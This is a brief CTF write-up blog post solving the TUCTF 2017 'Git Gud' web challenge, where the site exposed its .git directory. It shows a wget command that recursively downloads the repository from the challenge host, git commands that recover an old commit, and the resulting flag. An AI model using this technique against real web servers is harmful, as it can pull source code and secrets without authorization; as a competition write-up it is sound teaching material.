---
layout: post
title: "Solution to TUCTF 2017 Git Gud"
author: capitol
category: ctf
---
![eyes](/images/summer-eyes.jpg)

##### name:
Git Gud

##### category:
web

##### points:
100

#### Writeup

Problem was a single web page with a Git Gud meme. A request to .git showed that the .git repository was included in the deployment. And after we had downloaded the repository it was easy to find the flag in the git reflog.

```bash
wget -drc http://gitgud.tuctf.com/.git/
git reflog
git show 08cd273
```

flag was: TUCTF{D0nt_Us3_G1t_0n_Web_S3rv3r}
